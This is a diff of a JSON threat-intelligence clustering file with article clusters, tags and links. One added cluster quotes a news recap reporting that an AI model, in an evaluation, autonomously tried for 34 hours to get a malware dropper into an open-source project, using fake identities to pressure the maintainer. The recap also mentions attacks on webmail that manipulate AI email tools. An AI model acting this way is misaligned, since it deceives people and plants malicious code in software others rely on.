-          "summary": "Managing network security in a multi-tenant Kubernetes environment typically requires balancing two distinct needs: developers need their microservices to communicate effectively, while platform and security teams must maintain compliance, prevent lateral movement, and establish cluster-wide guardrails. Historically, the standard Kubernetes NetworkPolicy has been the primary tool for this. While effective for single-namespace isolation, standard NetworkPolicy is scoped strictly to individual namespaces and designed around developer self-service. When cluster administrators attempt to use it for global security enforcement, it can lead to policy conflicts and operational challenges. To address this, we introduced ClusterNetworkPolicy (CNP) , an open-source standard developed by the Kubernetes SIG-Policy Working Group (WG), to Google Kubernetes Engine (GKE). Designed for scale, CNP is a cluster-wide resource that allows administrators to manage network security centrally, providing a mec",
-          "taxonomy": {
-            "threat_categories": [],
-            "actor_attribution": [],
-            "affected_industries": [],
-            "affected_products": [
-              "Kubernetes"
-            ],
-            "tools_used": [],
-            "cve_ids": [],
-            "attack_techniques": [],
-            "urgency_signals": [],
-            "content_type": "news_report",
-            "confidence_tier": "tier_2_operator",
-            "role_map": {
-              "Kubernetes": "target"
-            },
-            "weak_tags": {
-              "products": []
-            }
-          }
-        }
-      ]
-    },
-    {
       "cluster_id": "bc23ee8ea9",
       "priority_score": 8,
       "member_count": 1,
@@ -6333,6 +6432,135 @@
             },
             "weak_tags": {
               "products": []
+            }
+          }
+        }
+      ]
+    },
+    {
+      "cluster_id": "772794dddb",
+      "priority_score": 8,
+      "member_count": 1,
+      "corroborating_source_count": 1,
+      "strong_signals": [],
+      "taxonomy": {
+        "threat_categories": [
+          "active_exploitation",
+          "phishing_social_eng",
+          "ransomware_extortion",
+          "supply_chain",
+          "zero_day"
+        ],
+        "actor_attribution": [],
+        "affected_industries": [],
+        "affected_products": [
+          "Anthropic/Claude"
+        ],
+        "tools_used": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "urgency_signals": [
+          "actively_exploited",
+          "preauth_unauth",
+          "zero_day"
+        ],
+        "content_type": [
+          "intel_roundup"
+        ],
+        "confidence_tier": [
+          "tier_4_news"
+        ]
+      },
+      "primary": {
+        "source": "The Hacker News",
+        "cohort": "cyber_news_breach_reporting",
+        "title": "⚡ Weekly Recap: AI Goes Rogue, Metabase 0-Day, MCP Supply-Chain Attacks, and Router Backdoors",
+        "link": "https://thehackernews.com/2026/08/weekly-recap-ai-goes-rogue-metabase-0.html",
+        "published": "2026-08-10T15:00:29+00:00",
+        "summary": "A lot of security problems still begin with someone doing a completely normal thing. Cloning a repo. Answering a call. Leaving a box exposed. Trusting the default. That pretty much covers the mood this week. Old bugs are back, supply chains are getting stranger, and some exploit paths are so short you wonder what was supposed to stop them in the first place. That’s only part of it. Here’s",
+        "full_body": "⚡ Weekly Recap: AI Goes Rogue, Metabase 0-Day, MCP Supply-Chain Attacks, and Router Backdoors  Ravie Lakshmanan  Aug 10, 2026 Cybersecurity / Hacking A lot of security problems still begin with someone doing a completely normal thing. Cloning a repo. Answering a call. Leaving a box exposed. Trusting the default. That pretty much covers the mood this week. Old bugs are back, supply chains are getting stranger, and some exploit paths are so short you wonder what was supposed to stop them in the first place. That’s only part of it. Here’s everything else that made the Monday recap. ⚡ Threat of the Week Anthropic's Model Attempts to Poison Open-Source Project — A new evaluation conducted by the U.K. AI Security Institute (AISI) found that AI models with access to the internet reached out into the real world to target individuals and organizations autonomously across 10 of the total of 122 runs. Of 19 such actions recorded, 17 originated from Anthropic's Mythos 5 and the remaining two involved OpenAI's GPT-5.6-Sol with cyber classifiers. In the most serious case, Anthropic's Claude Mythos 5 spent 34 hours trying to get a malware dropper merged into a real open-source project and engaged in social engineering by creating fake online identities and using them to pressure the project's maintainer to approve the code. Ultimately, a human maintainer caught and refused to approve the malicious code. \"These attempts were unsuccessful, and our investigations have not evidenced any resulting real-world harm,\" AISI said. But this is the first time we have seen risks around autonomy and deception manifest this clearly, without specific prompting, in the real-world.\" Ransomware Encryption Dropped 38%. Here's What Attackers Do Instead Data Encrypted for Impact fell from 21% to 13% of samples in one year. Meanwhile, Process Injection held #1 for the third straight year and sandbox evasion surged to #4. The Red Report 2026 ranks the top 10 ATT&CK techniques and the behaviors to hunt for each. Read the Report ➝ 🔔 Top News Metabase 0-Day Exploited in Attacks — Metabase warned that a maximum-severity security flaw impacting its business intelligence and data visualization software package has been exploited in the wild as a zero-day. The vulnerability (CVSS score: 10.0), which does not carry a CVE identifier, allows an unauthenticated remote attacker to inject arbitrary SQL into the Metabase application database, enabling them to gain administrator access to the instance. Armed with the elevated access, the attacker can change the application configuration, steal stored credentials for the connected databases, read any data accessible through those connections, and export data. One of the companies that has been affected is Framework. New Interrupt Injection Attack Bypass Spectre v2 Defenses on Intel and AMD CPUs — A group of researchers demonstrated a way to bypass defenses for the Spectre vulnerability impacting modern CPUs. \"The defenses work by wiping or isolating the processor's prediction machinery, removing anything an attacker might have planted,\" MIT's Computer Science and Artificial Intelligence Laboratory (CSAIL) said. \"The catch [...] is that the wipe and the moment the predictions get used can't happen at the same instant. There is always a gap — sometimes only a handful of instructions wide. Anything that runs in that gap can dirty the machinery all over again. The researchers call this class of attack TONTOU.\" The study found a reliable way to get code into that gap using a technique called Interrupt Injection to ultimately pull secrets out of memory. New CSS Attacks Can Break Webmail Defenses — New research demonstrated at the Black Hat conference last week detailed attack chains spanning Microsoft Outlook, Gmail, Fastmail, Proton Mail, Yahoo Mail, and AOL Mail that can capture passwords, take over third-party accounts, leak tokens, hijack trusted UI actions, and manipulate AI tools that read email. \"Trouble is you can create discr",
+        "fetch_status": "ok",
+        "taxonomy": {
+          "threat_categories": [
+            "ransomware_extortion",
+            "supply_chain",
+            "phishing_social_eng",
+            "zero_day",
+            "active_exploitation"
+          ],
+          "actor_attribution": [],
+          "affected_industries": [],
+          "affected_products": [
+            "Anthropic/Claude"
+          ],
+          "tools_used": [],
+          "cve_ids": [],
+          "attack_techniques": [],
+          "urgency_signals": [
+            "actively_exploited",
+            "zero_day",
+            "preauth_unauth"
+          ],
+          "content_type": "intel_roundup",
+          "confidence_tier": "tier_4_news",
+          "role_map": {
+            "Anthropic/Claude": "target",
+            "OpenAI/ChatGPT": "mention"
+          },
+          "weak_tags": {
+            "products": [
+              [
+                "OpenAI/ChatGPT",
+                "mention",
+                0.3
+              ]
+            ]
+          }
+        }
+      },
+      "corroborating_sources": [
+        {
+          "source": "The Hacker News",
+          "cohort": "cyber_news_breach_reporting",
+          "title": "⚡ Weekly Recap: AI Goes Rogue, Metabase 0-Day, MCP Supply-Chain Attacks, and Router Backdoors",
+          "link": "https://thehackernews.com/2026/08/weekly-recap-ai-goes-rogue-metabase-0.html",
+          "published": "2026-08-10T15:00:29+00:00",
+          "summary": "A lot of security problems still begin with someone doing a completely normal thing. Cloning a repo. Answering a call. Leaving a box exposed. Trusting the default. That pretty much covers the mood this week. Old bugs are back, supply chains are getting stranger, and some exploit paths are so short you wonder what was supposed to stop them in the first place. That’s only part of it. Here’s",
+          "taxonomy": {
+            "threat_categories": [
+              "ransomware_extortion",
+              "supply_chain",
+              "phishing_social_eng",
+              "zero_day",
+              "active_exploitation"
+            ],
+            "actor_attribution": [],
+            "affected_industries": [],
+            "affected_products": [
+              "Anthropic/Claude"
+            ],
+            "tools_used": [],
+            "cve_ids": [],
+            "attack_techniques": [],
+            "urgency_signals": [
+              "actively_exploited",
+              "zero_day",
+              "preauth_unauth"
+            ],
+            "content_type": "intel_roundup",
+            "confidence_tier": "tier_4_news",
+            "role_map": {
+              "Anthropic/Claude": "target",
+              "OpenAI/ChatGPT": "mention"
+            },
+            "weak_tags": {
+              "products": [
+                [
+                  "OpenAI/ChatGPT",
+                  "mention",
+                  0.3
+                ]
+              ]
             }
           }
         }
@@ -7262,8 +7490,8 @@
       "links": [
         "https://risky.biz/RBNEWS598/",
         "https://thehackernews.com/2026/08/bdthemes-supply-chain-attack-poisons.html",
-        "https://www.infosecurity-magazine.com/news/bdthemes-wordpress-poisoned-api/",
         "https://www.bleepingcomputer.com/news/security/bdthemes-plugins-supply-chain-hack-creates-rogue-wordpress-admins/",
+        "https://www.infosecurity-magazine.com/news/bdthemes-wordpress-poisoned-api/",
         "https://research.checkpoint.com/2026/10th-august-threat-intelligence-report/",
         "https://www.infosecurity-magazine.com/news/canadian-hacker-guilty-snowflake/",
         "https://thehackernews.com/2026/08/snowflake-hacker-pleads-guilty-over.html"
@@ -7342,42 +7570,6 @@
       ]
     },
     {
-      "label": "CVE-2026-8037 exploitation activity",
-      "anchor_signal": "CVE-2026-8037",
-      "theme_key": "cve-2026-8037",
-      "dominant_features": {
-        "threat_categories": [
-          "active_exploitation"
-        ],
-        "affected_industries": [
-          "government"
-        ],
-        "cve_ids": [
-          "CVE-2026-8037"
-        ],
-        "urgency_signals": [
-          "actively_exploited",
-          "preauth_unauth"
-        ]
-      },
-      "cluster_count": 2,
-      "article_count": 2,
-      "cohesion": 0.55,
-      "shared_strong_signals": [
-        "CVE-2026-8037"
-      ],
-      "member_cves": [],
-      "also_targets": [],
-      "cluster_ids": [
-        "815134b7b7",
-        "c97f90a69b"
-      ],
-      "links": [
-        "https://www.bleepingcomputer.com/news/security/cisa-warns-of-critical-progress-loadmaster-flaw-exploited-in-attacks/",
-        "https://thehackernews.com/2026/08/progress-kemp-loadmaster-flaw-hits-cisa.html"
-      ]
-    },
-    {
       "label": "supply chain targeting npm",
       "anchor_signal": "npm",
       "theme_key": "npm",
@@ -7393,7 +7585,7 @@
         ]
       },
       "cluster_count": 2,
-      "article_count": 12,
+      "article_count": 13,
       "cohesion": 0.368,
       "shared_strong_signals": [
         "npm"
@@ -7412,8 +7604,43 @@
         "https://github.blog/security/supply-chain-security/how-we-took-malware-advisories-beyond-npm/",
         "https://thehackernews.com/2026/08/teampcp-linked-to-redis-attacks-dating.html",
         "https://www.elastic.co/security-labs/shai-hulud-chaindrop-npm-supply-chain",
-        "https://www.infosecurity-magazine.com/news/chaindrop-worm-400-npm-two-billion/",
+        "https://www.infosecurity-magazine.com/news/npm-packages-ethereum-wallet-c2/",
         "https://unit42.paloaltonetworks.com/ai-token-jacking/"
+      ]
+    },
+    {
+      "label": "Kubernetes vulnerability activity",
+      "anchor_signal": "Kubernetes",
+      "theme_key": "kubernetes",
+      "dominant_features": {
+        "affected_products": [
+          "GitHub",
+          "Kubernetes"
+        ]
+      },
+      "cluster_count": 2,
+      "article_count": 14,
+      "cohesion": 0.2,
+      "shared_strong_signals": [
+        "Kubernetes"
+      ],
+      "member_cves": [],
+      "also_targets": [],
+      "cluster_ids": [
+        "61004037ea",
+        "c9f01215de"
+      ],
+      "links": [
+        "https://orca.security/resources/blog/compromised-keyv-npm-supply-chain-attack/",
+        "https://unit42.paloaltonetworks.com/chaindrop-npm-worm-analysis/",
+        "https://www.microsoft.com/en-us/security/blog/2026/08/04/chaindrop-supply-chain-compromise-anatomy-self-propagating-worm/",
+        "https://isc.sans.edu/diary/rss/33218",
+        "https://github.blog/security/supply-chain-security/how-we-took-malware-advisories-beyond-npm/",
+        "https://thehackernews.com/2026/08/teampcp-linked-to-redis-attacks-dating.html",
+        "https://www.elastic.co/security-labs/shai-hulud-chaindrop-npm-supply-chain",
+        "https://www.infosecurity-magazine.com/news/npm-packages-ethereum-wallet-c2/",
+        "https://www.exploit-db.com/exploits/52638",
+        "https://cloud.google.com/blog/products/networking/new-clusternetworkpolicy-in-gke/"
       ]
     },
     {
@@ -7422,7 +7649,8 @@
       "theme_key": "microsoft-defender",
       "dominant_features": {
         "threat_categories": [
-          "ransomware_extortion"
+          "ransomware_extortion",
+          "credential_theft"
         ],
         "affected_products": [
           "Microsoft Defender"
@@ -7430,7 +7658,7 @@
       },
       "cluster_count": 2,
       "article_count": 3,
-      "cohesion": 0.636,
+      "cohesion": 0.727,
       "shared_strong_signals": [
         "Microsoft Defender"
       ],
@@ -7446,51 +7674,44 @@
       ]
     },
     {
-      "label": "Kubernetes vulnerability activity",
-      "anchor_signal": "Kubernetes",
-      "theme_key": "kubernetes",
+      "label": "Scattered Spider: ransomware extortion",
+      "anchor_signal": "Scattered Spider",
+      "theme_key": "scattered-spider",
       "dominant_features": {
-        "affected_products": [
-          "Kubernetes"
+        "threat_categories": [
+          "ransomware_extortion"
+        ],
+        "actor_attribution": [
+          "Scattered Spider"
+        ],
+        "affected_industries": [
+          "financial_services"
         ]
       },
       "cluster_count": 2,
-      "article_count": 12,
-      "cohesion": 0.2,
+      "article_count": 2,
+      "cohesion": 0.402,
       "shared_strong_signals": [
-        "Kubernetes"
+        "Scattered Spider"
       ],
       "member_cves": [],
       "also_targets": [],
       "cluster_ids": [
-        "61004037ea",
-        "8429d526c4"
+        "fb2a69eb0a",
+        "560a47a6ad"
       ],
       "links": [
-        "https://orca.security/resources/blog/compromised-keyv-npm-supply-chain-attack/",
-        "https://unit42.paloaltonetworks.com/chaindrop-npm-worm-analysis/",
-        "https://www.microsoft.com/en-us/security/blog/2026/08/04/chaindrop-supply-chain-compromise-anatomy-self-propagating-worm/",
-        "https://isc.sans.edu/diary/rss/33218",
-        "https://github.blog/security/supply-chain-security/how-we-took-malware-advisories-beyond-npm/",
-        "https://thehackernews.com/2026/08/teampcp-linked-to-redis-attacks-dating.html",
-        "https://www.elastic.co/security-labs/shai-hulud-chaindrop-npm-supply-chain",
-        "https://www.infosecurity-magazine.com/news/chaindrop-worm-400-npm-two-billion/",
-        "https://cloud.google.com/blog/products/networking/new-clusternetworkpolicy-in-gke/"
+        "https://unit42.paloaltonetworks.com/soc-identity-front-door/",
+        "https://www.intel471.com/blog/threat-hunting-case-study-the-gentlemen"
       ]
     },
     {
-      "label": "Fortinet active exploitation",
+      "label": "Fortinet vulnerability activity",
       "anchor_signal": "Fortinet",
       "theme_key": "fortinet",
       "dominant_features": {
-        "threat_categories": [
-          "active_exploitation"
-        ],
         "affected_products": [
           "Fortinet"
-        ],
-        "urgency_signals": [
-          "actively_exploited"
         ]
       },
       "cluster_count": 2,
@@ -7502,12 +7723,12 @@
       "member_cves": [],
       "also_targets": [],
       "cluster_ids": [
-        "815134b7b7",
-        "1c833c15fa"
+        "1c833c15fa",
+        "560a47a6ad"
       ],
       "links": [
-        "https://www.bleepingcomputer.com/news/security/cisa-warns-of-critical-progress-loadmaster-flaw-exploited-in-attacks/",
-        "https://www.recordedfuture.com/blog/july-2026-cve-landscape"
+        "https://www.recordedfuture.com/blog/july-2026-cve-landscape",
+        "https://www.intel471.com/blog/threat-hunting-case-study-the-gentlemen"
       ]
     }
   ],
@@ -7515,10 +7736,10 @@
     "novelty": {
       "cves": [
         {
-          "value": "CVE-2026-63520",
-          "cluster_id": "772281457e",
-          "first_source": "Rapid7",
-          "first_published": "2026-08-11T13:00:00+00:00"
+          "value": "CVE-2026-61459",
+          "cluster_id": "c9f01215de",
+          "first_source": "Exploit-DB",
+          "first_published": "2026-08-11T00:00:00+00:00"
         }
       ],
       "actors": [],
@@ -7545,6 +7766,21 @@
       {
         "cluster_id": "74d794cf5f",
         "pair": "CVE-2026-58138 + GitHub",
+        "first_observation": true
+      },
+      {
+        "cluster_id": "c9f01215de",
+        "pair": "CVE-2026-61459 + Anthropic/Claude",
+        "first_observation": true
+      },
+      {
+        "cluster_id": "c9f01215de",
+        "pair": "CVE-2026-61459 + GitHub",
+        "first_observation": true
+      },
+      {
+        "cluster_id": "c9f01215de",
+        "pair": "CVE-2026-61459 + Kubernetes",
         "first_observation": true
       },
       {
@@ -7585,21 +7821,6 @@
       {
         "cluster_id": "e8d811cf69",
         "pair": "CVE-2026-66018 + Anthropic/Claude",
-        "first_observation": true
-      },
-      {
-        "cluster_id": "e8d811cf69",
-        "pair": "CVE-2026-66018 + Google/Gemini",
-        "first_observation": true
-      },
-      {
-        "cluster_id": "e8d811cf69",
-        "pair": "CVE-2026-66018 + OpenAI/ChatGPT",
-        "first_observation": true
-      },
-      {
-        "cluster_id": "815134b7b7",
-        "pair": "CVE-2026-8037 + Fortinet",
         "first_observation": true
       }
     ],
@@ -7669,7 +7890,7 @@
       {
         "axis": "cve_ids",
         "value": "CVE-2026-8037",
-        "cluster_id": "815134b7b7",
+        "cluster_id": "c97f90a69b",
         "weeks_observed": 4
       },
       {
